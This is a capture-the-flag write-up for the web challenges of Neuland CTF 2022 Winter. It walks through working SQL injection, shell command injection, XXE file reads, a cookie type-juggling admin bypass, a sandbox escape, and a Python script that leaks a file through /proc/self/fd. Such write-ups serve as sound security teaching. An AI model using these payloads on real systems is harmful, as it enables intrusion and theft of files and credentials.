---
title: "Neuland CTF 2022 Winter - Web"
authors: ["0xFFD700", "manuv"]
date: 2022-12-07T18:07
published: true
tags:
- ctf
- writeup
- security
- cyber
- cybersecurity
---

## Scavenger hunt - Easy

*Can you find all the pieces of the flag?*

</br>

The first part of the flag can be found in the website's page source in the header metatag content.

![](../src/blog/images/neuland-ctf-12-2022/meta.webp)

</br>

The second part of the flag is hidden in a cookie called "flag".

![](../src/blog/images/neuland-ctf-12-2022/keks.webp)

</br>

The last part of the flag is hidden in the robots.txt file. This file can be used to specify whether and how the website may be visited by a web crawler.

![](../src/blog/images/neuland-ctf-12-2022/robots.webp)

</br>

The flag is `nland{c0nc47_411_7h3_p4rts}`.

<br>

## Databases are hard - Easy
*Password managers? No need for those!*
</br>

The challenge is a login form built on SQLite. It does not use any kind of prepared statements or sanitizing - the parameters are just added to the query directly. Enter `' OR 1=1; --` as the password to get the flag.

The flag is `nland{c4n7-b3l13v3-th15-57i11-h4pp3n5}`.

<br>

## Latency - Easy
*Keep it simple, right? Just use existing tools to build upon.*

</br>

The challenge is a simple web-based ping tool. If you enter `google.com`, in the background, it calls `ping -c 4 google.com` and returns the results. You can exploit this by following up with arbitrary shell commands, for example google.com; ls will execute `ping -c 4 google.com; ls` and subsequently list all the files in the working directory. Enter `google.com; cat flag.txt` to get the flag.

The flag is `nland{5h377s-4r3-3v3rywh3r3}`.

<br>

## XML is stupid - Easy

*There's a reason why JSON became so popular. The flag is in /opt/next/flag.txt.*

</br>

The challenge is a web-based viewer for a custom XML format. The flag location is provided in the challenge text (`/opt/next/flag.txt`). An example file is also provided.

You need to use XML External Entities to inject the flag into one of the parsed fields. Do inject the contents of `/opt/next/flag.txt` into the `first-name` field, save the following as an `.xml` file and upload it:

```js
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///opt/next/flag.txt"> ]>

<root>
  <first-name>&xxe;</first-name>
  <last-name>Mustermann</last-name>
</root>
```

The flag will be returned in place of the first name.

The flag is `nland{y0u-sh0u7dn7-us3-xm7}`.

<br>

## Into the Backrooms 1 - Easy

*This challenge has four different parts. The source code is always the same. The parts build on each other and you should work on them in their order.*

*I am currently working on the backend of a new shop system. It is still in development and not finished. Have a look for yourself and try to log into an account.*
<br>

[into_the_backrooms.zip](https://github.com/neuland-ingolstadt/Neuland-CTF-2022-Winter/blob/ced4cc975bdbe9e96325c74e69775142f68267f6/CTF%20Aufgaben/Web/Into%20the%20Backrooms%20-%20Easy%20Medium%20Hard/Public/into_the_backrooms.zip)

<br>

We are presented with the backend of a shop system. The frontend isn't of much use. There are two QR codes and the message to "Look somewhere else!". We only get rickrolled if we scan the first QR code. 

![](../src/blog/images/neuland-ctf-12-2022/frontend.webp)

As already expected we have to focus on the backend. For this sake I am going to use Postman to send the requests. The task tells us to log into an account. We have to register a new account and log into it.

From the following piece of code we can see that we need to send a post request to the endpoint `/register`. 

```js
api.post('/register', (req, res) => {
	let reqUser = req.body.username
	let reqPwd = req.body.password

	if(!reqUser || !reqPwd)
		return res.json({ error: true, msg: "Missing parameters." })
    ...
})

```

In the body we need to include a username and password. This line tells us to format the body as a json: `api.use(bodyParser.json())` 
The final request in Postman looks like this:

![](../src/blog/images/neuland-ctf-12-2022/register.webp)

If we used a unique username, we get back the response that we are registered and two cookies are set.
* uid --> user id of the account
* passwd --> hashed password of the account

To login we can use the same request and sent it to the endpoint `/login`.

![](../src/blog/images/neuland-ctf-12-2022/login.webp)

The response does contain the first flag.

The flag is `nland{w3lc0m3_70_y0ur_n3w_4cc0un7}`.

<br>

## Into the Backrooms 2 - Medium

*This challenge has four different parts. The source code is always the same. The parts build on each other and you should work on them in their order.*

*Once you are logged in it is also possible to buy stuff. Have a look at our offers.*

<br>

[into_the_backrooms.zip](https://github.com/neuland-ingolstadt/Neuland-CTF-2022-Winter/blob/ced4cc975bdbe9e96325c74e69775142f68267f6/CTF%20Aufgaben/Web/Into%20the%20Backrooms%20-%20Easy%20Medium%20Hard/Public/into_the_backrooms.zip)

<br>

Once you have finished the first part of the challenge you should know how to register a new account and how to log into it. If you are logged in, you are able to buy products. The shop has stickers, T-shirts and flags in stock. Of course we want to buy a flag as it does set the flag as a comment. The relevant code can be seen below:

```js
api.post('/buy/:article', (req, res) => {
	if(req.userUid == -1)
		return res.json({ error: true, msg: "Login first." })

	let article = req.params.article
	let err = null
	let comment = ''

	if(!req.body.quantity || !req.body.price)
		err = "Missing parameters."

	if(article == "t-shirt") {
			comment = "You will receive a T-shirt after the CTF."
	} else if(article == "sticker") {
			comment = "You can grab some stickers from the desk at the front."
	} else if(article == "flag") {
			comment = flag2
	} else err = "Product not in stock."

	if(err)
		return res.json({ error: true, msg: err})

	let total = req.body.quantity * req.body.price
	res.cookie('order',`${req.userOrder},${total}`)
	res.json({ error: false, msg: "Order submitted for " + total.toString() + " €.", comment: comment })
})
```

We need to send a post request to the endpoint `/buy/flag`. The body needs to contain a JSON with the fields `quantity` and `price`. The two cookies passwd and uid need to be set as well to the values of the created account. The response will then contain a comment with the second flag. An `order` cookie is set with the response as well.

![](../src/blog/images/neuland-ctf-12-2022/buy_flag.webp)

The flag is `nland{w3lc0m3_70_y0ur_n3w_4cc0un7}`.

<br>

## Into the Backrooms 3 - Hard

*This challenge has four different parts. The source code is always the same. The parts build on each other and you should work on them in their order.*

*The checkout function is still under development. Only the admin account is allowed to use it for testing. Don't even try to find a loophole and to dig deeper.*

<br>

[into_the_backrooms.zip](https://github.com/neuland-ingolstadt/Neuland-CTF-2022-Winter/blob/ced4cc975bdbe9e96325c74e69775142f68267f6/CTF%20Aufgaben/Web/Into%20the%20Backrooms%20-%20Easy%20Medium%20Hard/Public/into_the_backrooms.zip)

<br>

The third part of this challenge series is already a lot trickier. We need to use the admin account with uid 0 to be able to use the checkout function. 

```js
api.get('/checkout', (req, res) => {
	...
	if(parseInt(req.userUid) != 0 || req.userOrder.includes("("))
		return res.json({ error: true, msg: "You are not allowed to do this. Checkout function is still in testing." })
    ...
```

However, we don't have access to it. We have control over the `uid` cookie and can change it to whatever value we want. We need to know the password of the account the uid belongs to to be able to log into the account. This means we can't just change the uid to the admin account as well. We are also not able to find the password of the account or to hijack the cookies. However, there is a small detail in the authentification process that we can abuse. 

Authentification process:

```js
api.use((req, res, next) => {
	req.userUid = -1
	req.userOrder = ""

	let order = req.cookies.order
	let uid = req.cookies.uid
	let passwd = req.cookies.passwd

	if(uid == undefined || passwd == undefined)
		return next()

	let found = false
	for(let user of users.entries())
		if(user[0].uid == uid && user[0].password == passwd)
			found = true

	if(found) {
		req.userUid = uid
		if(order != undefined)
			req.userOrder = order
	}

	next()
})
```

The uid cookie is sent to the backend as a string. During the comparission with a number in the authentification process the type of the string is being juggled into a number. 

The admin validation in the checkout function does use the parseInt() function to change the string into a number.

```js
if(parseInt(req.uid) != 0 || req.userOrder.includes("("))
```

We can exploit this. We need to find a number which is equal to 0 if passed to parseInt as a string. At the same time the number must be equal to our uid as well when being juggled to a number during the authentification process. Can we find such a number? 

<br>

The scientific notation or e notation will be helpful here. It is used to express extremely large or small numbers. The number 1,000,000 can be written as 1 * 10<sup>6</sup> or 1e6. We can convert any number to scientific notation and they will evaluate to the same number. If the uid of our registered account is 1, we can represent it as 0.1e1. We can change the value of the uid cookie to this value and we will still be able to log in. The uid value in the cookie will be passed as a string. The authentification middleware function will still allow us to log in as "0.1e1" == 1.

```js
if(user[0].uid == uid && user[0].password == passwd)  // 1 == "0.1e1"
```

The uid for the requests will then be set to the provided value "0.1e1".

The admin validation for the checkout function is coded differently as already mentioned.

```js
if(parseInt(req.uid) != 0 || req.userOrder.includes("(")) // parseInt("0.1e1") == 0
```

parseInt() will evalutate the string value of our uid to 0. This allows us to bypass the admin validation and we can still user our created account.
To sum things up: We can change to value of the uid cookie to `uid=0.1e1` and then we will be able to bypass the admin validation. You will have to change the value accourdingly as you will most likely have a different uid. You have to convert your original uid into scientific notation with a leading zero. A uid of 27 would be set to 0.27e2.

Now we are able to use the checkout function.

The checkout function contains a sandbox that allows us to execute code.

```js
result = new String(test_env.run(`sum([${req.userOrder}])`))
```

We have control over the `userOrder` cookie and therefore can change it to execute a command. The cookie can not contain the character `(`. We need to find a way to call functions without the parentheses. Tagged template literals can be used to execute a function on a string. This allows us to call our function without the parentheses. 

```js
console.log`Hello world!`
getFlag``
```

We need to send a get request to the endpoint `/checkout` with the cookies `uid`, `passwd` and `order`. 
`uid` needs to be set the scientific notation of the user id of our account starting with a leading zero.
`passwd` needs to be the hashed password ouf our account.
`order` needs to include the function we want to execute. In this case we want to set the value to ` getFlag`` ` to execute the function. It will return the third flag.

The final request will look like this:

![](../src/blog/images/neuland-ctf-12-2022/checkout.webp)

The flag is `nland{y0u_w3r3_n07_5upp053d_70_b3_4bl3_70_u53_7h3_ch3ck0u7_func710n_y37}`.

<br>

## Into the Backrooms 4 - Hard

*This challenge has four different parts. The source code is always the same. The parts build on each other and you should work on them in their order.*

*It seems like you were somehow able to execute the checkout function. Impressive. But seriously, you need to stop. There is now way that you are able to read the last flag. Don't even try.*

<br>

[into_the_backrooms.zip](https://github.com/neuland-ingolstadt/Neuland-CTF-2022-Winter/blob/ced4cc975bdbe9e96325c74e69775142f68267f6/CTF%20Aufgaben/Web/Into%20the%20Backrooms%20-%20Easy%20Medium%20Hard/Public/into_the_backrooms.zip)

<br>

This is were things really get complicated. We are able to bypass the admin validation in the checkout function and we can execute certain functions defined in a sandbox. The last flag is on the file system of the host. The sandbox allows us to execute a `readFile` function with a path. It allows us the read files on the host if the user `app` has permissions to read the file. We are not allowed to use the term flag in the path. If we do so, the content of the file will not be returned to us. The file however will still be read. This means we need to read the `flag.txt` without using its name. There are two concepts we need to familiarize with first to be able to understand the solution: The `/proc` filesystem and `file descriptors`.

For each process there is a folder inside the `/proc` filesystem named after the PID, process id, of the process. It contains information about the running process. The link `self` points to the process reading the file system. In our case we don't need to find the PID as we can just use `self`. The process folders in `/proc` contain a subfolder named `fd`. It contains all the file descriptors that currently exist for the process. File descriptors are unique integer IDs and each of them points to a different open file in the kernel. A file descriptor is created when a file is opened and deleted when the file is explicitly closed. The file descriptors are links to the original file. This is our possibility to address the flag file under a different name. The only problem is that we won't know which file descriptor is associated with our flag file. So we will have to try all of them. Due to the behaviour of the `readFile` function we are able to open a file descriptor to the flag file even if the content is not returned to us. 

The final solution looks something like this:
1. Start a thread that reads the flag over and over again. This will create the file descriptors `/proc/self/fd`.
2. Start another thread that tries to read the files in `/proc/self/fd`.
3. Repeat 1. and 2. in a loop until the flag is returned. 

A python solve script will look like this:

```python
from time import sleep

import requests
import threading
import uuid

base_url = 'http://localhost:8000/'

register_url = base_url + 'register'

username = str(uuid.uuid4())
username = username.replace('-', '')

register_data = {
    'username': username,
    'password': '12345678'
}

r = requests.post(url=register_url, json=register_data)

if r.json()['error']:
    print("Registration failed!")
    exit()

login_url = base_url + 'login'

login_data = register_data

r = requests.post(url=login_url, json=login_data)

if r.json()['error']:
    print("Login failed!")
    exit()

cookies = r.cookies.get_dict()
passwd = cookies['passwd']
uid = cookies['uid']


def e_formatter(n):
    a = '{:.4E}'.format(float(n))
    e = a.find('E')
    return '0.{}{}{}{:02d}'.format(a[0], a[2:e], a[e:e + 2], abs(int(a[e + 1:]) * 1 + 1))


uid = e_formatter(uid)

checkout_url = base_url + 'checkout'


def create_fd():
    order = 'a = _=> { return readFile`/flag.txt` + a`` }, a``'

    COOKIES = {
        'order': order,
        'passwd': passwd,
        'uid': uid
    }

    r = requests.get(url=checkout_url, cookies=COOKIES)


def read_flag(flag):
    order = ''
    for i in range(30):
        order += 'readFile`/proc/self/fd/{}`,'.format(i)
    order = order[:-1]

    COOKIES = {
        'order': order,
        'passwd': passwd,
        'uid': uid
    }

    r = requests.get(url=checkout_url, cookies=COOKIES)

    try:
        if r.json()['error']:
            print("Trying again!")
    except (TypeError, requests.exceptions.JSONDecodeError) as e:
        if "nland" in r.text:
            r = r.text.split('\\n')[1]
            flag[0] = r


flags = ['failed']
flag = ['failed']

while "nland" not in flag:
    t1 = threading.Thread(target=create_fd)
    t2 = threading.Thread(target=read_flag, args=(flags,))
    t1.start()
    t2.start()
    t1.join()
    t2.join()
    flag = flags[0]
    sleep(1.0)

print(flag)
```

The start of the script registers a new user and logs into it and creates the uid cookie in scientific notation. The second part then sends the requests to retrieve the flag.
The `readFile` function reads the file specified by path through `fs.readFileSync(path)`. This function creates a file descriptors, reads the file and closes the file descriptors. If we call the `readFile` function multiple times during a run in the sandbox, the timeout will eventually run out. If this happens at the exact same time as the file descriptor is still open, it won't get closed.

```js
readFile: (path) => {
    path = new String(path).toString()
    if(fs.statSync(path).size == 0)
        return null
    let r = fs.readFileSync(path)
    if(!path.includes('flag'))
        return r
    return null
}
```

The `create_fd` function reads the flag file over and over again and creates the file descriptors as described above.

The `read_flag` function tries to read the flag from the file desciptors. We are not guaranteed a hit on the first try. This is because the `create_fd` function first needs to create the open file descriptors. After a while there are enough file descriptors so that we will be able to find an open one before the timeout and can read the flag. We will execute the two functions at the same time in separate threads in a loop. Eventually the script will print out the flag.

The flag is `nland{wh0_70ld_y0u_4b0u7_pr0c_4nd_f1l3_d35cr1p70r5?}`.
